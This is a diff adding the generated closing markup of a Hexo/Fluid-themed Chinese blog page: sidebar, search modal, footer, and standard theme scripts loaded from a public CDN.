+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
